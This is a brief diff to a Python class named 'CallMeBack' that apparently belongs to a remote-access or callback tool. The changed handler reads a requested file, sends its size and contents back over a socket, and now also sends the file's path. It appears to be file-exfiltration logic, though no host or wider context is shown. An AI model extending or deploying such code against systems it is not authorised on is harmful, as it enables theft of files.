@@ -104,6 +104,7 @@ class CallMeBack:
                             FileData = FileData.read()     
                             SendBack.send(len(FileData).to_bytes(4, byteorder='big'))
                             SendBack.sendall(FileData)
+                            SendBack.sendall(bytes(path.encode()))
                     except FileNotFoundError:
                            pass
                 elif 'loadfile' in data.split()[0] :
